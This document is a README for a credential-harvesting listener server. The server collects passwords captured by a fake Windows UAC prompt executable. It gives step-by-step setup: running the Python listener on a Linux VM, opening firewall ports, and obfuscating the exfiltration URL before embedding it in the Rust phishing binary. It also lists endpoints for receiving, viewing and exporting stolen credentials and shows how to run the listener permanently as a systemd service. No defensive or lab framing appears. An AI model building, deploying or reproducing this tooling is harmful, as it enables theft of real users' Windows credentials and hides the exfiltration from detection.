# UAC Credential Listener Server (Linux VM Setup)

A lightweight listener server designed to catch, log, and visualize credentials captured by the Windows UAC clone executable.

---

## 🚀 Quick Start on Linux VM (Ubuntu / Debian / Kali)

### 1. Transfer the Files
Transfer the `server/` directory or `server.py` to your Linux VM:
```bash
# Example via SCP from your Windows host or git
scp -r server/ user@<VM_IP>:~/uac-listener/
cd ~/uac-listener
```

### 2. Run the Server
The script has a **Dual-Engine** design. If you don't have Flask or an active internet connection, it runs using Python's standard library with **zero dependencies**:

#### Option A: Zero Dependencies (Built-in standard library)
```bash
python3 server.py --host 0.0.0.0 --port 8080
```

#### Option B: With Flask (Recommended for production)
```bash
pip3 install -r requirements.txt
python3 server.py --host 0.0.0.0 --port 8080
```

---

## ⚙️ Firewall Setup on Linux

Ensure incoming traffic on port `8080` is allowed through the VM firewall:

```bash
# UFW (Ubuntu/Debian)
sudo ufw allow 8080/tcp

# Firewalld (CentOS/RHEL/Fedora)
sudo firewall-cmd --add-port=8080/tcp --permanent
sudo firewall-cmd --reload

# Check your VM IP address
ip a | grep inet
```

---

## 🔗 Configuring the UAC Clone to Point to this VM

On your Windows build machine:

1. Determine your Linux VM's IP address (e.g. `192.168.1.150`).
2. Run the URL obfuscator utility to generate the encrypted configuration string:
   ```powershell
   cargo run --bin encode_url "http://192.168.1.150:8080/api/credentials"
   ```
3. Copy the output string into [src/obfuscate.rs](file:///c:/Users/CarlosAlbertoAcevesC/UAC/src/obfuscate.rs) under `OBFUSCATED_ENDPOINT_B64`:
   ```rust
   const OBFUSCATED_ENDPOINT_B64: &str = "<PASTE_OBFUSCATED_STRING_HERE>";
   ```
4. Build the final Windows release binary:
   ```powershell
   cargo build --release
   ```

---

## 📊 Endpoints & Features

| Endpoint | Method | Description |
| :--- | :--- | :--- |
| `http://<VM_IP>:8080/` | `GET` | Web Dashboard with live 3-second auto-refresh, password reveal, clipboard copy, and stats. |
| `http://<VM_IP>:8080/api/credentials` | `POST` | Ingestion endpoint called by the UAC executable. Stores to SQLite and prints to terminal. |
| `http://<VM_IP>:8080/api/credentials` | `GET` | Returns all captured records as JSON. |
| `http://<VM_IP>:8080/api/export/csv` | `GET` | Downloads full database as CSV spreadsheet. |
| `http://<VM_IP>:8080/api/export/json` | `GET` | Downloads full database as structured JSON. |
| `http://<VM_IP>:8080/health` | `GET` | Health check (`{"status": "healthy"}`). |

---

## 🔄 Running as a Background Systemd Service (Optional)

To keep the listener permanently running in the background on your Linux VM:

```bash
sudo tee /etc/systemd/system/uac-listener.service > /dev/null <<EOF
[Unit]
Description=UAC Credential Listener
After=network.target

[Service]
Type=simple
User=$(whoami)
WorkingDirectory=$(pwd)
ExecStart=/usr/bin/python3 $(pwd)/server.py --host 0.0.0.0 --port 8080
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable --now uac-listener
sudo systemctl status uac-listener
```
